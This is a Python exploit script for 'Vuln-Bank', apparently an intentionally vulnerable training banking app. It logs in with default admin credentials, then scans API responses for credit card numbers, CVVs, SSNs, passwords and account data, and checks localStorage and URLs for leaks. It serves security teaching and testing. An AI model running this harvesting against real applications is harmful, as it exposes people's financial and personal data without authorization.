#!/usr/bin/env python3
"""
Sensitive Data Exposure Exploit for Vuln-Bank

This script demonstrates how to extract sensitive data from the Vuln-Bank application
through dynamic testing of various endpoints and features.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import re
from urllib.parse import urljoin, parse_qs, urlparse
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
import time
import base64
import jwt

# Initialize colorama for colored output
init()

def login(base_url, username="admin", password="admin123"):
    """
    Login to get a valid JWT token
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to use for login
        password: Password to use for login
        
    Returns:
        tuple: (token, user_data) if login successful, (None, None) otherwise
    """
    print(f"{Fore.BLUE}[*] Logging in as {username}...{Style.RESET_ALL}")
    
    login_url = f"{base_url}/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(login_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            if token:
                print(f"{Fore.GREEN}[+] Login successful! Got valid JWT token.{Style.RESET_ALL}")
                return (token, data)
            else:
                print(f"{Fore.RED}[-] Login successful but no token received.{Style.RESET_ALL}")
                return (None, None)
        else:
            print(f"{Fore.RED}[-] Login failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return (None, None)
    except Exception as e:
        print(f"{Fore.RED}[-] Error during login: {str(e)}{Style.RESET_ALL}")
        return (None, None)

def test_unencrypted_transmission(base_url):
    """
    Test for unencrypted transmission of sensitive data
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    print(f"\n{Fore.BLUE}[*] Testing for unencrypted transmission of sensitive data...{Style.RESET_ALL}")
    
    # Check if the application uses HTTPS
    if base_url.startswith("https://"):
        print(f"{Fore.GREEN}[+] Application uses HTTPS for secure transmission.{Style.RESET_ALL}")
        return False
    else:
        print(f"{Fore.RED}[-] Application uses HTTP for transmission, which is insecure.{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] All data transmitted, including credentials and sensitive information, can be intercepted.{Style.RESET_ALL}")
        return True

def test_full_credit_card_exposure(base_url, token=None):
    """
    Test for exposure of full credit card numbers
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        dict: Dictionary of endpoints with exposed credit card information
    """
    print(f"\n{Fore.BLUE}[*] Testing for exposure of full credit card numbers...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        {"url": "/api/virtual-cards", "method": "GET"},
        {"url": "/api/virtual-cards/1", "method": "GET"},
        {"url": "/api/profile", "method": "GET"},
        {"url": "/api/transactions", "method": "GET"}
    ]
    
    # Define patterns for credit card numbers
    cc_patterns = [
        r"\b4[0-9]{12}(?:[0-9]{3})?\b",  # Visa
        r"\b5[1-5][0-9]{14}\b",          # MasterCard
        r"\b3[47][0-9]{13}\b",           # American Express
        r"\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b",  # Diners Club
        r"\b6(?:011|5[0-9]{2})[0-9]{12}\b",     # Discover
        r"\b(?:2131|1800|35\d{3})\d{11}\b"      # JCB
    ]
    
    # Define patterns for CVV
    cvv_patterns = [
        r"\"cvv\":\s*\"[0-9]{3,4}\"",
        r"\"security_code\":\s*\"[0-9]{3,4}\"",
        r"\"cvc\":\s*\"[0-9]{3,4}\""
    ]
    
    findings = {}
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint["url"])
        method = endpoint["method"]
        
        print(f"{Fore.BLUE}[*] Testing {method} {url}{Style.RESET_ALL}")
        
        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            else:  # POST
                response = requests.post(url, headers=headers, timeout=5)
            
            # Check if response is JSON
            try:
                resp_data = response.json()
                is_json = True
            except:
                resp_data = response.text
                is_json = False
            
            # Look for credit card information in the response
            exposed_cc_info = []
            
            if is_json:
                # Convert JSON to string for pattern matching
                resp_str = json.dumps(resp_data)
                
                # Check for credit card numbers
                for pattern in cc_patterns:
                    matches = re.finditer(pattern, resp_str)
                    for match in matches:
                        cc_number = match.group(0)
                        exposed_cc_info.append(f"Credit Card Number: {cc_number}")
                        print(f"{Fore.RED}[-] Found exposed credit card number: {cc_number}{Style.RESET_ALL}")
                
                # Check for CVV
                for pattern in cvv_patterns:
                    matches = re.finditer(pattern, resp_str)
                    for match in matches:
                        cvv_info = match.group(0)
                        exposed_cc_info.append(f"CVV: {cvv_info}")
                        print(f"{Fore.RED}[-] Found exposed CVV: {cvv_info}{Style.RESET_ALL}")
                
                # If we found credit card information, extract and display it
                if exposed_cc_info:
                    # Add to findings
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "exposed_cc_info": exposed_cc_info,
                        "response": resp_data
                    }
            else:
                # For non-JSON responses, check the raw text
                for pattern in cc_patterns:
                    matches = re.finditer(pattern, resp_data)
                    for match in matches:
                        cc_number = match.group(0)
                        exposed_cc_info.append(f"Credit Card Number: {cc_number}")
                        print(f"{Fore.RED}[-] Found exposed credit card number: {cc_number}{Style.RESET_ALL}")
                
                for pattern in cvv_patterns:
                    matches = re.finditer(pattern, resp_data)
                    for match in matches:
                        cvv_info = match.group(0)
                        exposed_cc_info.append(f"CVV: {cvv_info}")
                        print(f"{Fore.RED}[-] Found exposed CVV: {cvv_info}{Style.RESET_ALL}")
                
                if exposed_cc_info:
                    # Add to findings
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "exposed_cc_info": exposed_cc_info,
                        "response": "Non-JSON response with credit card information"
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {method} {endpoint['url']}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_pii_exposure(base_url, token=None):
    """
    Test for exposure of Personally Identifiable Information (PII)
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        dict: Dictionary of endpoints with exposed PII
    """
    print(f"\n{Fore.BLUE}[*] Testing for exposure of Personally Identifiable Information (PII)...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        {"url": "/api/profile", "method": "GET"},
        {"url": "/api/users", "method": "GET"},
        {"url": "/api/users/1", "method": "GET"},
        {"url": "/api/users/search", "method": "POST", "data": {"search_term": "admin"}}
    ]
    
    # Define patterns for PII
    pii_patterns = {
        "SSN": r"\b\d{3}-\d{2}-\d{4}\b",
        "Email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",
        "Phone": r"\b\+?1?\s*\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}\b",
        "Address": r"\b\d+\s+[A-Za-z\s]+(?:Street|St|Avenue|Ave|Road|Rd|Boulevard|Blvd|Lane|Ln|Drive|Dr|Way|Court|Ct|Plaza|Square|Sq|Parkway|Pkwy)\b",
        "Date of Birth": r"\b\d{4}-\d{2}-\d{2}\b|\b\d{2}/\d{2}/\d{4}\b",
        "Full Name": r"\"full_name\":\s*\"[^\"]+\"",
        "Username": r"\"username\":\s*\"[^\"]+\"",
        "Password": r"\"password\":\s*\"[^\"]+\""
    }
    
    findings = {}
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint["url"])
        method = endpoint["method"]
        data = endpoint.get("data")
        
        print(f"{Fore.BLUE}[*] Testing {method} {url}{Style.RESET_ALL}")
        
        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            else:  # POST
                response = requests.post(url, headers=headers, json=data, timeout=5)
            
            # Check if response is JSON
            try:
                resp_data = response.json()
                is_json = True
            except:
                resp_data = response.text
                is_json = False
            
            # Look for PII in the response
            exposed_pii = {}
            
            if is_json:
                # Convert JSON to string for pattern matching
                resp_str = json.dumps(resp_data)
                
                # Check for each type of PII
                for pii_type, pattern in pii_patterns.items():
                    matches = re.finditer(pattern, resp_str)
                    for match in matches:
                        pii_value = match.group(0)
                        if pii_type not in exposed_pii:
                            exposed_pii[pii_type] = []
                        exposed_pii[pii_type].append(pii_value)
                        print(f"{Fore.RED}[-] Found exposed {pii_type}: {pii_value}{Style.RESET_ALL}")
                
                # If we found PII, add to findings
                if exposed_pii:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "exposed_pii": exposed_pii,
                        "response": resp_data
                    }
            else:
                # For non-JSON responses, check the raw text
                for pii_type, pattern in pii_patterns.items():
                    matches = re.finditer(pattern, resp_data)
                    for match in matches:
                        pii_value = match.group(0)
                        if pii_type not in exposed_pii:
                            exposed_pii[pii_type] = []
                        exposed_pii[pii_type].append(pii_value)
                        print(f"{Fore.RED}[-] Found exposed {pii_type}: {pii_value}{Style.RESET_ALL}")
                
                if exposed_pii:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "exposed_pii": exposed_pii,
                        "response": "Non-JSON response with PII"
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {method} {endpoint['url']}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_account_numbers_exposure(base_url, token=None):
    """
    Test for exposure of account numbers and balances
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        dict: Dictionary of endpoints with exposed account information
    """
    print(f"\n{Fore.BLUE}[*] Testing for exposure of account numbers and balances...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        {"url": "/api/profile", "method": "GET"},
        {"url": "/api/transactions", "method": "GET"},
        {"url": "/check_balance/12345", "method": "GET"},
        {"url": "/api/users/1", "method": "GET"}
    ]
    
    # Define patterns for account information
    account_patterns = {
        "Account Number": r"\"account_number\":\s*\"[^\"]+\"",
        "Balance": r"\"balance\":\s*[0-9]+(?:\.[0-9]+)?",
        "IBAN": r"\b[A-Z]{2}[0-9]{2}[A-Z0-9]{4}[0-9]{7}(?:[A-Z0-9]?){0,16}\b",
        "Routing Number": r"\b[0-9]{9}\b"
    }
    
    findings = {}
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint["url"])
        method = endpoint["method"]
        
        print(f"{Fore.BLUE}[*] Testing {method} {url}{Style.RESET_ALL}")
        
        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            else:  # POST
                response = requests.post(url, headers=headers, timeout=5)
            
            # Check if response is JSON
            try:
                resp_data = response.json()
                is_json = True
            except:
                resp_data = response.text
                is_json = False
            
            # Look for account information in the response
            exposed_account_info = {}
            
            if is_json:
                # Convert JSON to string for pattern matching
                resp_str = json.dumps(resp_data)
                
                # Check for each type of account information
                for info_type, pattern in account_patterns.items():
                    matches = re.finditer(pattern, resp_str)
                    for match in matches:
                        info_value = match.group(0)
                        if info_type not in exposed_account_info:
                            exposed_account_info[info_type] = []
                        exposed_account_info[info_type].append(info_value)
                        print(f"{Fore.RED}[-] Found exposed {info_type}: {info_value}{Style.RESET_ALL}")
                
                # If we found account information, add to findings
                if exposed_account_info:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "exposed_account_info": exposed_account_info,
                        "response": resp_data
                    }
            else:
                # For non-JSON responses, check the raw text
                for info_type, pattern in account_patterns.items():
                    matches = re.finditer(pattern, resp_data)
                    for match in matches:
                        info_value = match.group(0)
                        if info_type not in exposed_account_info:
                            exposed_account_info[info_type] = []
                        exposed_account_info[info_type].append(info_value)
                        print(f"{Fore.RED}[-] Found exposed {info_type}: {info_value}{Style.RESET_ALL}")
                
                if exposed_account_info:
                    if endpoint["url"] not in findings:
                        findings[endpoint["url"]] = {}
                    findings[endpoint["url"]][method] = {
                        "exposed_account_info": exposed_account_info,
                        "response": "Non-JSON response with account information"
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {method} {endpoint['url']}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_sensitive_data_in_local_storage(base_url):
    """
    Test for sensitive data stored in browser local storage
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: Dictionary of sensitive data found in local storage
    """
    print(f"\n{Fore.BLUE}[*] Testing for sensitive data stored in browser local storage...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Note: This test requires manual verification in a browser.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Check the following JavaScript code for sensitive data storage:{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        "/",
        "/login",
        "/dashboard"
    ]
    
    # Define patterns for local storage usage
    local_storage_patterns = [
        r"localStorage\.setItem\(['\"]([^'\"]+)['\"],\s*([^)]+)\)",
        r"localStorage\[['\"]([^'\"]+)['\"]\]\s*=\s*([^;]+)"
    ]
    
    findings = {}
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        print(f"{Fore.BLUE}[*] Testing {url} for local storage usage...{Style.RESET_ALL}")
        
        try:
            response = requests.get(url, timeout=5)
            
            # Check if response is HTML
            if "text/html" in response.headers.get("Content-Type", ""):
                html_content = response.text
                
                # Parse HTML
                soup = BeautifulSoup(html_content, 'html.parser')
                
                # Find all script tags
                scripts = soup.find_all('script')
                
                # Look for local storage usage in inline scripts
                local_storage_items = []
                
                for script in scripts:
                    if script.string:  # Only process inline scripts
                        script_text = script.string
                        for pattern in local_storage_patterns:
                            matches = re.finditer(pattern, script_text)
                            for match in matches:
                                key = match.group(1)
                                value = match.group(2)
                                local_storage_items.append(f"{key}: {value}")
                                print(f"{Fore.RED}[-] Found potential sensitive data in localStorage: {key}: {value}{Style.RESET_ALL}")
                
                # Find all external script sources
                script_srcs = [script.get('src') for script in scripts if script.get('src')]
                
                # Check each external script
                for src in script_srcs:
                    if src.startswith(('http://', 'https://')):
                        script_url = src
                    else:
                        script_url = urljoin(base_url, src)
                    
                    print(f"{Fore.BLUE}[*] Checking external script: {script_url}{Style.RESET_ALL}")
                    
                    try:
                        script_response = requests.get(script_url, timeout=5)
                        script_text = script_response.text
                        
                        for pattern in local_storage_patterns:
                            matches = re.finditer(pattern, script_text)
                            for match in matches:
                                key = match.group(1)
                                value = match.group(2)
                                local_storage_items.append(f"{src} - {key}: {value}")
                                print(f"{Fore.RED}[-] Found potential sensitive data in localStorage in {src}: {key}: {value}{Style.RESET_ALL}")
                    
                    except requests.exceptions.RequestException as e:
                        print(f"{Fore.RED}[-] Error fetching external script {src}: {str(e)}{Style.RESET_ALL}")
                
                if local_storage_items:
                    # Add to findings
                    findings[endpoint] = {
                        "local_storage_items": local_storage_items
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {endpoint}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_sensitive_data_in_urls(base_url, token=None):
    """
    Test for sensitive data passed in URL parameters
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        dict: Dictionary of endpoints with sensitive data in URLs
    """
    print(f"\n{Fore.BLUE}[*] Testing for sensitive data passed in URL parameters...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        "/check_balance/12345",
        "/transactions/12345",
        "/api/users/1",
        "/api/virtual-cards/1"
    ]
    
    # Define sensitive parameter names
    sensitive_params = [
        "account_number",
        "balance",
        "user_id",
        "password",
        "token",
        "pin",
        "ssn",
        "dob",
        "email",
        "phone"
    ]
    
    findings = {}
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        print(f"{Fore.BLUE}[*] Testing {url} for sensitive data in URL...{Style.RESET_ALL}")
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            
            # Check for sensitive data in the URL path
            path = urlparse(url).path
            for param in sensitive_params:
                if param in path.lower():
                    print(f"{Fore.RED}[-] Found sensitive parameter in URL path: {param} in {path}{Style.RESET_ALL}")
                    if endpoint not in findings:
                        findings[endpoint] = {
                            "sensitive_in_path": [param]
                        }
                    else:
                        if "sensitive_in_path" not in findings[endpoint]:
                            findings[endpoint]["sensitive_in_path"] = []
                        findings[endpoint]["sensitive_in_path"].append(param)
            
            # Check for sensitive data in URL parameters
            query = urlparse(url).query
            if query:
                params = parse_qs(query)
                for param, value in params.items():
                    if param.lower() in sensitive_params:
                        print(f"{Fore.RED}[-] Found sensitive parameter in URL query: {param}={value}{Style.RESET_ALL}")
                        if endpoint not in findings:
                            findings[endpoint] = {
                                "sensitive_in_query": [{param: value}]
                            }
                        else:
                            if "sensitive_in_query" not in findings[endpoint]:
                                findings[endpoint]["sensitive_in_query"] = []
                            findings[endpoint]["sensitive_in_query"].append({param: value})
            
            # Check for links in the response that contain sensitive data
            if "text/html" in response.headers.get("Content-Type", ""):
                html_content = response.text
                soup = BeautifulSoup(html_content, 'html.parser')
                links = soup.find_all('a')
                
                for link in links:
                    href = link.get('href')
                    if href:
                        # Check for sensitive data in the link path
                        link_path = urlparse(href).path
                        for param in sensitive_params:
                            if param in link_path.lower():
                                print(f"{Fore.RED}[-] Found sensitive parameter in link path: {param} in {link_path}{Style.RESET_ALL}")
                                if endpoint not in findings:
                                    findings[endpoint] = {
                                        "sensitive_in_links": [f"{param} in {href}"]
                                    }
                                else:
                                    if "sensitive_in_links" not in findings[endpoint]:
                                        findings[endpoint]["sensitive_in_links"] = []
                                    findings[endpoint]["sensitive_in_links"].append(f"{param} in {href}")
                        
                        # Check for sensitive data in link parameters
                        link_query = urlparse(href).query
                        if link_query:
                            link_params = parse_qs(link_query)
                            for param, value in link_params.items():
                                if param.lower() in sensitive_params:
                                    print(f"{Fore.RED}[-] Found sensitive parameter in link query: {param}={value}{Style.RESET_ALL}")
                                    if endpoint not in findings:
                                        findings[endpoint] = {
                                            "sensitive_in_links": [f"{param}={value} in {href}"]
                                        }
                                    else:
                                        if "sensitive_in_links" not in findings[endpoint]:
                                            findings[endpoint]["sensitive_in_links"] = []
                                        findings[endpoint]["sensitive_in_links"].append(f"{param}={value} in {href}")
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {endpoint}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def main():
    # Redirect output to a file
    output_file = open("sensitive_data_results.txt", "w")
    sys.stdout = output_file
    print("STARTING SENSITIVE DATA EXPOSURE TEST - OUTPUT REDIRECTED TO FILE")
    
    parser = argparse.ArgumentParser(description="Test for sensitive data exposure in Vuln-Bank")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    parser.add_argument("--username", default="admin", help="Username to use for login")
    parser.add_argument("--password", default="admin123", help="Password to use for login")
    args = parser.parse_args()
    
    print(f"{Fore.YELLOW}=== Vuln-Bank Sensitive Data Exposure Exploit ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}[*] Target: {args.url}{Style.RESET_ALL}")
    
    # Test for unencrypted transmission
    unencrypted = test_unencrypted_transmission(args.url)
    
    # Login to get a token
    token, user_data = login(args.url, args.username, args.password)
    
    # Run tests that don't require authentication
    local_storage_findings = test_sensitive_data_in_local_storage(args.url)
    url_findings = test_sensitive_data_in_urls(args.url)
    
    # Run tests that require authentication
    cc_findings = {}
    pii_findings = {}
    account_findings = {}
    
    if token:
        cc_findings = test_full_credit_card_exposure(args.url, token)
        pii_findings = test_pii_exposure(args.url, token)
        account_findings = test_account_numbers_exposure(args.url, token)
    else:
        print(f"{Fore.YELLOW}[!] No authentication token available. Skipping authenticated tests.{Style.RESET_ALL}")
        # Try unauthenticated tests as well
        cc_findings = test_full_credit_card_exposure(args.url)
        pii_findings = test_pii_exposure(args.url)
        account_findings = test_account_numbers_exposure(args.url)
    
    # Summarize findings
    print(f"\n{Fore.YELLOW}=== Summary of Findings ==={Style.RESET_ALL}")
    
    total_findings = 0
    
    if unencrypted:
        print(f"{Fore.RED}[-] Application uses unencrypted HTTP for transmission{Style.RESET_ALL}")
        total_findings += 1
    
    if cc_findings:
        print(f"{Fore.RED}[-] Found full credit card information exposed in {len(cc_findings)} endpoints{Style.RESET_ALL}")
        total_findings += len(cc_findings)
    
    if pii_findings:
        print(f"{Fore.RED}[-] Found PII exposed in {len(pii_findings)} endpoints{Style.RESET_ALL}")
        total_findings += len(pii_findings)
    
    if account_findings:
        print(f"{Fore.RED}[-] Found account information exposed in {len(account_findings)} endpoints{Style.RESET_ALL}")
        total_findings += len(account_findings)
    
    if local_storage_findings:
        print(f"{Fore.RED}[-] Found sensitive data in localStorage in {len(local_storage_findings)} pages{Style.RESET_ALL}")
        total_findings += len(local_storage_findings)
    
    if url_findings:
        print(f"{Fore.RED}[-] Found sensitive data in URLs in {len(url_findings)} endpoints{Style.RESET_ALL}")
        total_findings += len(url_findings)
    
    if total_findings == 0:
        print(f"{Fore.GREEN}[+] No sensitive data exposure vulnerabilities found{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Total findings: {total_findings} instances of sensitive data exposure{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
